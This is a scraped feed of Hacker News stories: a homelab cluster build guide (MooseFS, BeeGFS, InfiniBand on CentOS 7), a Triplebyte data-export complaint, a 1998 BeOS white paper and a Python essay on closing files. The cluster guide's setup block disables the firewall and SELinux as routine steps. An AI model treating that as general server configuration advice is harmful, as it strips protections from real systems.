<p>After searching out <a href="http://www.regressionist.com/2020/06/20/reviews-of-distributed-filesystems/">filesystem reviews</a>, I decided to use <strong>MooseFS</strong> for my robust storage. It is easy to configure. It can handle my collection of drives of all sizes, and is robust to the failure of a drive, or even an entire server. It also has a nice browser-based monitoring tool. I have set it up to store one copy of each data chunk on an SSD, and the replicated chunk on a regular spinning disk. The clients are configured to prefer SSD chunkservers, which makes reading reasonably fast. Note: chunkserver labels apply to the whole server, so don’t mix SSDs and HDDs in one server if you want to explicitly prioritize reading from SSDs.</p>



<p>I considered paying for MooseFS Pro, but decided it was too expensive. For a 20TB lifetime license for versions 3.x and 4.x, I was quoted $1,620, or $810 if it was for non-commercial use. The main two benefits of getting a Pro license are 1) getting the high-availability of multiple online master servers instead of just metaloggers, and 2) getting erasure coding for more efficient use of storage space. The erasure coding is interesting to me, but for slow storage, big disks are really cheap. So, storing multiple full copies of a file isn’t such a big deal.</p>



<p>For serious speed, I’ve chosen <strong>BeeGFS</strong> with NVMe drives. BeeGFS supports RDMA (remote direct memory access) with infiniband, so it can move data between boxes without involving the CPUs. It is very fast. It is also relatively easy to configure. I am treating this sort of like volatile storage, and I have not set up “buddy mirrors.” Since I will lose data if my hardware fails, I frequently rsync with the robust storage. I was disappointed to find out that even Pro BeeGFS doesn’t support erasure coding. It would make more sense to use with these expensive NVMe drives. However, erasure coding also slows down both reading and writing. So, I’m ok with giving up robustness in order to have one blazing fast filesystem.</p>



<h2>Conclusion</h2>



<p>Benchmarking a distributed filesystem is complicated and workload-dependent. But everything is working as I hoped. My cluster is mostly hyperconverged, with CPU and storage combined in each server. However, I do have some servers that are clients/CPU only. They are less powerful, so I keep them powered off until needed, to conserve energy. I got an APC AP7911A rack-mount PDU on eBay, so controlling power to the different ports is easy.</p>



<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/07/apc-1.png" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/07/apc-1.png 488w, http://www.regressionist.com/wp-content/uploads/2020/07/apc-1-300x225.png 300w" sizes="(max-width: 488px) 100vw, 488px"></figure>



<p>Building a cluster has been a lot of fun, and previously slow processes are now excitingly fast. But I’m anxious to begin real research now, and stop messing around with infrastructure.</p>



<h2>Appendix A, configuring infiniband on CentOS 7</h2>



<p>As a non-HPC guy, learning about infiniband, and getting the network functioning was the hardest part of building the cluster. It took me a long time, and lots of reading and trial-and-error. For that reason, I think it’s worth posting detailed instructions on what eventually worked for me. I don’t believe I’m getting all that is possible out of my infiniband network, but I’m still very pleased with it.</p>



<h3>The cards</h3>



<p>I went with 79DJ3 Mellanox ConnectX-3 CX353A FDR InfiniBand + 56GbE/ 40GbE Single QSFP+ RDMA cards. The most recent ones I ordered on eBay were $35 each. I believe the PCIe lanes cannot handle the full bandwidth of the dual-port cards, which is why I stayed with the simpler single-port card/setup. I did have to order replacement brackets for a couple of my high-profile-PCIe computers.</p>



<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/06/79DJ3.png" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/06/79DJ3.png 785w, http://www.regressionist.com/wp-content/uploads/2020/06/79DJ3-300x186.png 300w, http://www.regressionist.com/wp-content/uploads/2020/06/79DJ3-768x476.png 768w, http://www.regressionist.com/wp-content/uploads/2020/06/79DJ3-624x387.png 624w" sizes="(max-width: 785px) 100vw, 785px"></figure>



<h3>The cables</h3>



<p>I went with Mellanox MC2207130-0A1 1.5M IB FDR QSFP copper cables for about $20 each. Fiber optic cables are better for long distances, but these passive cables have worked perfectly.</p>



<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/06/FDR_cable-1024x768.jpg" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/06/FDR_cable-1024x768.jpg 1024w, http://www.regressionist.com/wp-content/uploads/2020/06/FDR_cable-300x225.jpg 300w, http://www.regressionist.com/wp-content/uploads/2020/06/FDR_cable-768x576.jpg 768w, http://www.regressionist.com/wp-content/uploads/2020/06/FDR_cable-1536x1152.jpg 1536w, http://www.regressionist.com/wp-content/uploads/2020/06/FDR_cable-624x468.jpg 624w, http://www.regressionist.com/wp-content/uploads/2020/06/FDR_cable.jpg 1600w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h3>The switch</h3>



<p>There are two switches that will work. The first is a small unmanaged switch, the Mellanox SX6005. It runs about $90 used:</p>



<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6005.png" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6005.png 807w, http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6005-300x201.png 300w, http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6005-768x514.png 768w, http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6005-624x418.png 624w" sizes="(max-width: 807px) 100vw, 807px"></figure>



<p>The second is the larger, managed, Mellanox SX6036. It runs about $300 used:</p>



<figure><img src="http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6036-1024x353.jpg" alt="" srcset="http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6036-1024x353.jpg 1024w, http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6036-300x103.jpg 300w, http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6036-768x264.jpg 768w, http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6036-1536x529.jpg 1536w, http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6036-624x215.jpg 624w, http://www.regressionist.com/wp-content/uploads/2020/06/mellanox_SX6036.jpg 1600w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>If you have more than one switch involved, you can daisy chain them together. You can even run multiple cables between them, which will reduce the bottleneck between the switches. No special configuration is necessary, just plug in multiple cables, and it will spread the load among them to some degree.</p>



<h3>Subnet manager</h3>



<p>There needs to be exactly one subnet manager for the infiniband network. The managed switch can provide this service, but you need to enable it in the configuration interface. The unmanaged switch cannot provide this service. In that case, you need to run a subnet manager on one server. <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/networking_guide/sec-configuring_the_subnet_manager">It is trivial to install on CentOS 7:</a></p>



<pre><code>yum install opensm
systemctl enable opensm
systemctl start opensm</code></pre>



<h3>Software</h3>



<p>I’m using CentOS 7 on my cluster, because at this time neither MooseFS nor BeeGFS supports CentOS 8. When I first played around with Ubuntu, it was much more difficult to get infiniband working. And I also had to downgrade its kernel to get BeeGFS working. I don’t think it is worth all that hassle, and CentOS 7 is working great.</p>



<pre><code># install packages
yum groupinstall "Infiniband Support"
yum install net-tools mstflint infiniband-diags iperf

# disable firewall
systemctl status firewalld
systemctl stop firewalld
systemctl disable firewalld

# disable SELINUX
nano /etc/selinux/config
# set, then reboot
SELINUX=disabled

# start the RDMA service
systemctl start rdma
systemctl enable rdma</code></pre>



<h3>Updating the card firmware</h3>



<p>After installing the infiniband card, find out the PCI address:</p>



<pre><code># Check the device’s PCI address
lspci | grep Mellanox
# 04:00.0 Network controller: Mellanox Technologies MT27500 Family [ConnectX-3]
# so "04:00.0" is the address</code></pre>



<p>Next, use the PCI address to find the card’s PSID, and note the current firmware version:</p>



<pre><code># Identify the adapter card's PSID (last line of the output)
mstflint -d 04:00.0 q
#Image type:            FS2
#FW Version:            2.32.5100
#FW Release Date:       3.9.2014
#Rom Info:              type=PXE version=3.4.306 proto=IB
#Device ID:             4099
#Description:           Node             Port1            Port2            Sys image
#GUIDs:                 e41d2d0300b2bdc0 e41d2d0300b2bdc1 e41d2d0300b2bdc2 e41d2d0300b2bdc3 
#MACs:                                       e41d2db2bdc1     e41d2db2bdc2
#VSD:                   
#PSID:                  DEL1100001019</code></pre>



<p>Now use the PSID to find the latest firmware version:</p>



<pre><code># Download the firmware BIN file from the Mellanox website that matches your card's PSID:
http://www.mellanox.com/page/firmware_table_dell?mtag=oem_firmware_download
Adapters
Dell EMC ConnectX-3 Firmware Download Center
2.42.5000
079DJ3
DEL1100001019
http://www.mellanox.com/downloads/firmware/fw-ConnectX3-rel-2_42_5000-079DJ3-FlexBoot-3.4.752.bin.zip</code></pre>
</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.regressionist.com/2020/07/05/poor-mans-cluster/">http://www.regressionist.com/2020/07/05/poor-mans-cluster/</a></em></p>]]>
            </description>
            <link>http://www.regressionist.com/2020/07/05/poor-mans-cluster/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742683</guid>
            <pubDate>Sun, 05 Jul 2020 22:33:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Triplebyte data download doesn’t give you all your data]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23742473">thread link</a>) | @wolfgang42
<br/>
July 5, 2020 | https://www.linestarve.com/blog/post/triplebyte-data-download/ | <a href="https://web.archive.org/web/*/https://www.linestarve.com/blog/post/triplebyte-data-download/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="<%= page.layout %>-<%= page.slug %>" itemscope="" itemprop="blogPost">
	<div>
		<div>
			<div>
				<p>In May of last year I decided to start looking for a new job, and started by taking <a href="https://triplebyte.com/">Triplebyte</a>’s quiz. Having passed that, I spent the next three months going through the rest of their process, from a <a href="https://triplebyte.com/interview_guide">two-hour remote interview</a> all the way through to final negotiations with the company whose offer I selected. Throughout the process they were extremely competent and helpful, and at the end of it all I had only good things to say about them. They made the whole process go extremely smoothly, answered all the questions I had and gave me a ton of advice on the whole process, and their screening process was not only great from the my perspective but also gave me confidence in the quality of all their candidates.</p>

<p>Then, a little over a month ago, I got an email announcing the upcoming launch of Triplebyte’s new public profiles. I thought they were was a neat idea, and made a note that I should turn mine on next time I started a job hunt. Then someone <a href="https://news.ycombinator.com/item?id=23279837">posted the email on Hacker News</a>, pointing out that buried in the middle of the email was the fact that these new profiles were going to be opt-<em>out,</em> and unless I turned it off in the next week my profile would become public. This understandably caused an uproar, which the Triplebyte CEO Ammon <a href="https://news.ycombinator.com/item?id=23280460">completely misinterpreted</a>, posting a series of <a href="https://news.ycombinator.com/item?id=23280120">inflammatory comments</a> that <a href="https://news.ycombinator.com/item?id=23280472">misunderstood what people were upset about</a> before vanishing. A few days later he came back with a very apologetic email explaining that they weren’t going to go through with it after all, though it received <a href="https://news.ycombinator.com/item?id=23303037">mixed reactions</a>, with a lot of people being concerned that the idea had been considered at all.</p>

<p>In the midst of all this, I submitted a request through the <a href="https://triplebyte.com/privacy-center">Triplebyte privacy center</a> to download my data. (I considered deleting my account, but decided to give them the benefit of the doubt until things settled down.) After approving the request by clicking an email link, I was informed that it might take up to 30 days to complete my request, so I settled down to wait. As the weeks passed, I thought that the sudden influx of requests must have overwhelmed whoever was responsible for gathering the data from all the systems it was stored in.</p>

<p>Then, 36 days after I first submitted the request, I got an email informing me that my data was now ready to be downloaded. I clicked the link in the email, and then another link on the next page, and finally I got—</p>

<p>A 2,917 byte JSON blob.</p>

<p><em>Odd,</em> I thought, <em>that seems like an awfully long time for so little data.</em> (It’s just over 81 bytes per day, in fact, though I realize that’s a silly metric.) Still, I was relieved to know that they hadn’t been gathering reams of data about me behind my back. Scanning over the minified data, it looked like all they had was my address, some information I’d given them about my past jobs and preferred languages, and a couple of recent IP addresses. Seemingly they hadn’t even kept any information at all about my job search with them.</p>

<p>Then I opened up the file in a JSON viewer and gradually realized: <em>this was not all the information they had.</em> It wasn’t even all of the information they were <em>willing to admit</em> they had—it was missing some obvious things, like the text descriptions on the <code>education</code> and <code>work experience</code> objects, which were prominently displayed on my profile page. As far as I can tell, all I got was a sloppy attempt at making it look at a casual glance like they’d given me what I asked for.</p>

<p>This raises serious concerns for me about Triplebyte, even more so than their plan to make profiles public by default, which started this all. That may well have been born of overenthusiastic naïvité, and was quickly rescinded after being exposed to public comment. After that fiasco, though, I would have expected them to double down on making sure that they were taking privacy seriously. They had over a month before sending me this data to fix any issues with the system, and instead they sent me some slapdash attempt at maybe giving me a whiff of my data.</p>

<p>Triplebyte (as they explain in their privacy center) “care deeply about how your personal information is used and shared,” but apparently not enough to actually put effort into getting it right when you ask for it.</p>

<p>(I’ve sent them an email asking what happened to the rest of the data, and will update this post when I get a response. As it’s the weekend I may not hear back for a few days.)</p>

			</div>
		</div>
	</div>
</article></div>]]>
            </description>
            <link>https://www.linestarve.com/blog/post/triplebyte-data-download/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742473</guid>
            <pubDate>Sun, 05 Jul 2020 22:02:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Design of modern OS for next century (1998)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23742432">thread link</a>) | @smallstepforman
<br/>
July 5, 2020 | http://testou.free.fr/www.beatjapan.org/mirror/www.be.com/products/beos/mediaos.html | <a href="https://web.archive.org/web/*/http://testou.free.fr/www.beatjapan.org/mirror/www.be.com/products/beos/mediaos.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<td><p><img src="http://testou.free.fr/www.beatjapan.org/mirror/www.be.com/products/beos/resources/mediaos_175.gif" width="175" height="94"></p>

<p><span size="-1">Technical White Paper</span><i><br clear="ALL"></i><b><span size="+3">The Media OS</span></b></p>

<p><i>The needs of digital content design, not to mention physics <br clear="ALL">and economics, are coming into conflict with current <br clear="ALL">OS
architectures. A new definition, the Media OS, <br clear="ALL">can unlock
the door to more powerful media-based personal <br clear="ALL">systems,
and extract more performance from the systems <br clear="ALL">we are using
today.</i></p>



<p>In 1985, a new concept in personal computing began to take hold. Known
as "desktop publishing" and sparked by graphical user interfaces
and the invention of the laser printer, this new use for PCs grew from a
special interest group into a major market that changed the face of paper
publishing, from newsletters to annual reports to advertising. And in the
process, computer-based publishing sold millions of people on the usefulness
of personal computers, and changed the very nature of their work.</p>

<p>A decade later, desktop publishing as we have known it is coming to an
end. It is not the message that is being changed, but the way the message
is being conveyed. CD-ROMs provide us with a high capacity distribution
mechanism that costs pennies to produce in volume. DVDs are on the horizon,
promising to obliterate the CD-ROM and take capacities to new levels. And
the Internet is rushing towards universal coverage, able to deliver any
type of information, to any user, for the cost of the communications channel
and an inexpensive server.</p>

<p>This <i>digital media</i> is changing the way the message is conveyed.
Instead of static images on a page, digital media presents us with a mix
of text, digital audio, digital video, two-way communications, and 3D graphics
and animations.</p>

<p>Content designers everywhere, already computerized by the previous revolution,
have taken to the new media like ducks to water, experimenting with audio,
video and graphics in a myriad of combinations.</p>

<p>In response to the demand of the new media, production lead times are
shrinking from months to days, or even hours. These digital designers are
using new sets of software tools to manipulate this high bandwidth information
in as real-time as possible.</p>

<p>And in the process, they are bringing the personal computer as we know
it to its knees.</p>



<hr><b>Today's Limitations</b><hr>

<p>The computing industry has grown up with promises of doubling processing
power and halving equipment costs every 18 months or so. That pace hasn't
slowed. We have vastly more powerful hardware today than we had even three
years ago.</p>

<p>But the demands of digital media are increasing the need for processing
power at an even faster rate. Digital design requires that we squeeze every
bit of performance out of our current systems, and that we look to opening
new avenues for gaining performance, even as microprocessors continue to
advance.</p>

<p>Unfortunately, in the process applications are exceeding what the current
generation of operating systems were designed to do. Almost all existing
systems were originally designed decades ago, when the idea of personal
computers dealing with real-time video, audio, communications and other
high-bandwidth applications was practically science fiction. Windows 95 has
its roots in DOS, Windows NT in the VAX systems originally designed by DEC,
Mac OS in the early ideas of Xerox Parc and Mach in the labs of Carnegie-Mellon,
both designed in the late 1970s.</p>

<p>As the importance of audio, video and interactive communications has
increased in recent years, we've had to devise increasingly clever -- and
complex -- methods of delivering the performance required of media-based
applications because the <i>foundations</i> of today's systems were simply
not designed with high-bandwidth media in mind.</p>

<p>One example of aging foundations is the use of multiple processors in
a single system. The architectures of most of today's mainstream operating
systems are optimized for execution on uniprocessor systems, an assumption
borne of the days when microprocessors were very expensive. Adding multiprocessor
(MP) capability to these systems is difficult, and often goes only half way.
To gain the maximum benefit, all operating system services and applications
must be written with MP capability in mind, something that is virtually
impossible to do without major disruption. Those of today's systems that
can make some use of multiple processors do so in a coarse-grain way, failing
to take maximum advantage of the hardware resources available.</p>

<p>In addition, as more and more features have been added to today's operating
systems, layers of software "silt" have built up upon their architectural
foundations. These layers deliver new services, route around services no
longer required, provide specialized functions for individual applications
that can't be delivered any other way, and, most of all, provide a level
of backward compatibility. Unfortunately, as this software silt builds up,
it consumes more of the computer's processing power and hardware resources.
And it adds to the complexity of the system -- reducing performance, lowering
stability, and lengthening the time it takes to deliver new software.</p>

<p>This increasing complexity has had two effects. First, customers are
paying for more expensive hardware than they should, just to obtain acceptable
performance with mainstream productivity applications. The effort to counteract
this problem forms the basis of the <i>network computer </i>(NC) concept
-- by simplifying operating systems, moving to modern applications, and removing
the silt, computing can become less expensive.</p>

<p>And second, users are not able to take advantage of the real processing
power that is inherent in today's advanced microprocessors because of the
operating systems silt that lies in the way, making media-based applications
more expensive, and less powerful, than they should be. Solving this problem
lies at the heart of the <i>Media OS</i> concept.</p>



<hr><b>The Necessities of Digital Media</b><hr>

<p>It's not enough to add a few features and call an operating system a
"Media OS." An operating system needs to be architected to deal
natively with digital media. Our experiences with today's generation of
personal computers provide a glimpse at what is necessary to create a true
media-based system, and to squeeze the most possible power out of a system's
hardware resources. From this experience, we can identify five broad areas
in which a media-based system must excel.</p>

<p><img src="http://testou.free.fr/www.beatjapan.org/mirror/www.be.com/products/beos/resources/proc_cycles_sm.gif" width="207" height="255"><b>Maximize Processing Power</b></p>

<p>The power of microprocessors continues to advance at a predictable pace.
However, the needs of digital content creators have outstripped even the
best efforts of microprocessor makers, and physics, to keep up. A Media
OS can't rely simply on single processors to handle the load, which means
that it must be <i>multiprocessor capable.</i></p>

<p>Why are multiprocessor systems important? Today, the power of personal
computer systems is generally dependent on a single microprocessor. This
means that we must wait for new, faster generations of microprocessors to
become available in order to build more powerful personal computers.</p>

<p>Multiprocessing gives us a way around this problem. First, it gives us
access to even more powerful systems. We can multiply the effect of increases
in microprocessor performance across multiple processors, rather than just
one. This can provide access to vastly more powerful systems than we have
today, yet with today's PC technologies.</p>

<p>Second, multiprocessing provides us with a more economical way of reaching
a given performance point. The highest performance processor, 400 MHz today,
costs significantly more than 300 MHz processors. Thus it can cost just
as much to put two 300 MHz processors into a system as it does to put a
single 400 MHz processor. Yet the two processors combined deliver 600 MHz
of available cycles. The result is that using a multiprocessor approach
opens a new axis for hardware manufacturers to explore in price-performance
-- leading to new performance levels and options for end users.<img src="http://testou.free.fr/www.beatjapan.org/mirror/www.be.com/products/beos/resources/price_perf_sm.gif" width="274" height="206"></p>

<p>Opening up new, multiprocessor-based solutions for the mainstream is
a key requirement as we take media design into the next century. There are
a number of other ways to maximize processor performance. For example, how
an operating system implements multiprocessor capability can be even more
important than the capability itself. We'll examine this further a bit later
in this discussion.</p>



<p><b>Graphics Power and Flexibility</b></p>

<p>In addition to consuming massive amounts of processing power, a key characteristic
of the work of digital designers is that it involves the manipulation of
graphics, preferably in real-time (manipulation with no "lag"
or processing time from the user's perspective.) To accomplish this, media-based
systems have to address two things involving graphics capabilities.</p>

<p>First they need to take advantage of specialized graphics coprocessors.
Graphics co-processing is a specialized type of multiprocessing that can
help increase the performance of a system dramatically. This is especially
true in 3D graphics and video compression and decompression, where 
function-specific chips can boost throughput significantly.</p>

<p>Second, the graphics capabilities must be flexible. The types of graphics
work being done by digital designers varies greatly. Some do more 3D work
than video, others more 2D than 3D, and so on. Because of this, a Media
OS must be flexible enough to allow hardware to be configured in the way
that's best for the end user. In addition, flexibility and modularity means
that graphics hardware can be upgraded as new, more powerful solutions become
available, or as the user's needs change.</p>



<p><b>Access to Large Amounts of Storage</b></p>

<p>Another key characteristic of digital design is the amount of data required.
We have moved from floppy storage, to hard drive storage, to CD-ROMs, providing
us with direct access to significantly more data than only a few years ago.
Average hard drive sizes have increased from a few hundred megabytes and
are now approaching 4 gigabytes.</p>

<p><img src="http://testou.free.fr/www.beatjapan.org/mirror/www.be.com/products/beos/resources/file_size.gif" width="189" height="192">
But this is nothing compared to what's going to be required
in the near future. One hour of digital …</p></td></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://testou.free.fr/www.beatjapan.org/mirror/www.be.com/products/beos/mediaos.html">http://testou.free.fr/www.beatjapan.org/mirror/www.be.com/products/beos/mediaos.html</a></em></p>]]>
            </description>
            <link>http://testou.free.fr/www.beatjapan.org/mirror/www.be.com/products/beos/mediaos.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742432</guid>
            <pubDate>Sun, 05 Jul 2020 21:57:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Contrarian view on closing files]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 90 (<a href="https://news.ycombinator.com/item?id=23742390">thread link</a>) | @coady
<br/>
July 5, 2020 | https://coady.github.io/posts/closing-files/ | <a href="https://web.archive.org/web/*/https://coady.github.io/posts/closing-files/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody text">
    <div>
<div>

<div>
<div>
<h2 id="Contrarian-view-on-closing-files.">Contrarian view on closing files.<a href="#Contrarian-view-on-closing-files.">¶</a>
</h2>
<p>It has become conventional wisdom to always explicitly close file-like objects, via context managers.
The <a href="https://google.github.io/styleguide/pyguide.html#311-files-and-sockets">google style guide</a>
is representative:</p>
<blockquote>
<p>Explicitly close files and sockets when done with them.
Leaving files, sockets or other file-like objects open unnecessarily has many downsides, including:</p>
<p>They may consume limited system resources, such as file descriptors.</p>
<ul>
<li>Code that deals with many such objects may exhaust those resources unnecessarily if they're not returned to the system promptly after use.</li>
<li>Holding files open may prevent other actions being performed on them, such as moves or deletion.</li>
<li>Files and sockets that are shared throughout a program may inadvertantly be read from or written to after logically being closed. If they are actually closed, attempts to read or write from them will throw exceptions, making the problem known sooner.</li>
</ul>
<p>Furthermore, while files and sockets are automatically closed when the file object is destructed, tying the life-time of the file object to the state of the file is poor practice, for several reasons:</p>
<ul>
<li>There are no guarantees as to when the runtime will actually run the file's destructor. Different Python implementations use different memory management techniques, such as delayed Garbage Collection, which may increase the object's lifetime arbitrarily and indefinitely.</li>
<li>Unexpected references to the file may keep it around longer than intended (e.g. in tracebacks of exceptions, inside globals, etc).</li>
</ul>
<p>The preferred way to manage files is using the "with" statement:</p>

<pre><code>with open("hello.txt") as hello_file:
    for line in hello_file:
        print line</code></pre>
</blockquote>
<h3 id="In-theory">In theory<a href="#In-theory">¶</a>
</h3>
<p>Good points, and why limit this advice to file descriptors?  Any resource may be limited or require exclusivity;  that's why they're called resources.  Similarly one should always explicitly call <code>dict.clear</code> when finished with a <code>dict</code>.  After all, "there are no guarantees as to when the runtime will actually run the &lt;object's&gt; destructor.  And "code that deals with many such objects may exhaust those resources unnecessarily", such as memory, or whatever else is in the <code>dict</code>.</p>
<p>But in all seriousness, this advice is applying a notably higher standard of premature optimization to file descriptors than to any other kind of resource.  There are plenty of Python projects that are guaranteed to run on CPython for a variety of reasons, where destructors are immediately called.  And there are plenty of Python projects where file descriptor usage is just a non-issue.  It's now depressingly commonplace to see this in <code>setup.py</code> files:</p>

</div>
</div>
</div>
<div>
<div>
<p>In&nbsp;[&nbsp;]:</p>
<div>
    <div>
<div><pre><span></span><span>with</span> <span>open</span><span>(</span><span>"README.md"</span><span>)</span> <span>as</span> <span>readme</span><span>:</span>
    <span>long_description</span> <span>=</span> <span>readme</span><span>.</span><span>read</span><span>()</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div>

<div>
<p>Let's consider a practical example: a <code>load</code> function which is supposed to read and parse data given a file path.</p>
</div>
</div>
<div>
<div>
<p>In&nbsp;[&nbsp;]:</p>
<div>
    <div>
<div><pre><span></span><span>import</span> <span>csv</span>
<span>import</span> <span>json</span>

<span>def</span> <span>load</span><span>(</span><span>filepath</span><span>):</span>
    <span>"""the supposedly bad way"""</span>
    <span>return</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>filepath</span><span>))</span>

<span>def</span> <span>load</span><span>(</span><span>filepath</span><span>):</span>
    <span>"""the supposedly good way"""</span>
    <span>with</span> <span>open</span><span>(</span><span>filepath</span><span>)</span> <span>as</span> <span>file</span><span>:</span>
        <span>return</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>file</span><span>)</span>

<span>def</span> <span>load</span><span>(</span><span>filepath</span><span>):</span>
    <span>"""with a different file format"""</span>
    <span>with</span> <span>open</span><span>(</span><span>filepath</span><span>)</span> <span>as</span> <span>file</span><span>:</span>
        <span>return</span> <span>csv</span><span>.</span><span>reader</span><span>(</span><span>file</span><span>)</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div>

<div>
<div>
<p>Which versions work correctly?  Are you sure?  If it's not immediately obvious why one of these is broken, that's the point.  In fact, it's worth trying out before reading on.</p>
<p>...</p>
<p>The <code>csv</code> version returns an iterator over a closed file.  It's a violation of procedural abstraction to know whether the result of <code>load</code> is lazily evaluated or not; it's just supposed to implement an interface.  Moreover, according to this best practice, it's <em>impossible</em> to write the <code>csv</code> version correctly.  As absurd as it sounds, it's just an abstraction that can't exist.</p>
<p>Defiantly clever readers are probably already trying to fix it.  Maybe like this:</p>

</div>
</div>
</div>
<div>
<div>
<p>In&nbsp;[&nbsp;]:</p>
<div>
    <div>
<div><pre><span></span><span>def</span> <span>load</span><span>(</span><span>filepath</span><span>):</span>
    <span>with</span> <span>open</span><span>(</span><span>filepath</span><span>)</span> <span>as</span> <span>file</span><span>:</span>
        <span>yield from</span> <span>csv</span><span>.</span><span>reader</span><span>(</span><span>file</span><span>)</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div>

<div>
<div>
<p>No, it will not be fixed.  This version only appears to work by <em>not</em> closing the file until the generator is exhausted or collected.</p>
<p>This trivial example has deeper implications.  If one accepts this practice, then one must also accept that storing a file handle anywhere, such as on an instance, is also disallowed.  Unless of course that object then virally implements it owns context manager, ad infinitum.</p>
<p>Furthermore it demonstrates that often the context is not being managed locally.  If a file object is passed another function, then it's being used outside of the context.  Let's revisit the <code>json</code> version, which works because the file is fully read.  Doesn't a json parser have some expensive parsing to do after it's read the file?  It might even throw an error.  And isn't it desirable, trivial, <a href="https://github.com/python/cpython/blob/master/Lib/json/__init__.py#L274">and likely</a> that the implementation releases interest in the file as soon as possible?</p>
<p>So in reality there are scenarios where the supposedly good way could keep the file open <em>longer</em> than the supposedly bad way.  The original inline version does exactly what it's supposed to do: close the file when all interested parties are done with it.  Python uses garbage collection to manage shared resources.  Any attempt to pretend otherwise will result in code that is broken, inefficient, or reinventing reference counting.</p>
<p>A true believer now has to accept that <code>json.load</code> is a useless and dangerous wrapper, and that the only correct implementation is:</p>

</div>
</div>
</div>
<div>
<div>
<p>In&nbsp;[&nbsp;]:</p>
<div>
    <div>
<div><pre><span></span><span>def</span> <span>load</span><span>(</span><span>filepath</span><span>):</span>
    <span>with</span> <span>open</span><span>(</span><span>filepath</span><span>)</span> <span>as</span> <span>file</span><span>:</span>
        <span>contents</span> <span>=</span> <span>file</span><span>.</span><span>read</span><span>()</span>
    <span>return</span> <span>json</span><span>.</span><span>loads</span><span>(</span><span>contents</span><span>)</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div>

<div>
<div>
<p>This line of reasoning reduces to the absurd: a file should never be passed or stored anywhere.  Next an example where the practice has caused real-world damage.</p>
<h3 id="In-practice">In practice<a href="#In-practice">¶</a>
</h3>
<p><a href="https://requests.readthedocs.io/en/master/">Requests</a> is one of the most popular python packages, and <a href="https://docs.python.org/3/library/http.client.html#module-http.client">officially recommended</a>.  It includes a <a href="http://requests.readthedocs.org/en/latest/user/advanced/#session-objects">Session</a> object which supports closing via a context manager.  The vast majority of real-world code uses the the top-level functions or single-use sessions.</p>

</div>
</div>
</div>
<div>
<div>
<p>In&nbsp;[&nbsp;]:</p>
<div>
    <div>
<div><pre><span></span><span>response</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>...</span><span>)</span>

<span>with</span> <span>requests</span><span>.</span><span>Session</span><span>()</span> <span>as</span> <span>session</span><span>:</span>
    <span>response</span> <span>=</span> <span>session</span><span>.</span><span>get</span><span>(</span><span>...</span><span>)</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div>

<div>
<div>
<p>Sessions manage the connection pool, so this pattern of usage is establishing a new connection every time.  There are popular standard API clients which seriously do this, for every single request to the same endpoint.</p>
<p>Requests' documentation prominently states that "Keep-alive and HTTP connection pooling are 100% automatic".  So part of the blame may lay with that phrasing, since it's only "automatic" if sessions are reused.  But surely a large part of the blame is the dogma of closing sockets, and therefore sessions, explicitly.
The whole point of a connection pool is that it may leave connections open, so users who genuinely need this granularity are working at the wrong abstraction layer.  <code>http.client</code> is already builtin for that level of control.</p>
<p>Tellingly, requests' own top-level functions didn't always close sessions.  There's a long history to that code, including a <a href="https://github.com/kennethreitz/requests/commit/3155bc99362a8c6ab136b6a3bb999732617cd2e5">version that only closed sessions on success</a>.  An older version was <a href="https://github.com/kennethreitz/requests/issues/1882">causing warnings</a>, when run to check for such warnings, and was being blamed for the <em>appearance</em> of <a href="https://github.com/kennethreitz/requests/issues/1685">leaking memory</a>.  Those threads are essentially debating whether a resource pool is "leaking" resources.</p>

</div>
</div>
</div>
<div>

<div>
<div>
<h3 id="Truce">Truce<a href="#Truce">¶</a>
</h3>
<p>Prior to <code>with</code> being introduced in Python 2.5, it was <em>not</em> recommended that inlined reading of a file required a <code>try... finally</code> block.  Far from it, in the past idioms like <code>open(...).read()</code> and <code>for line in open(...)</code> were lauded for being succinct and expressive.  But if all this orphaned file descriptor paranoia was well-founded, it would have been a problem back then too.</p>
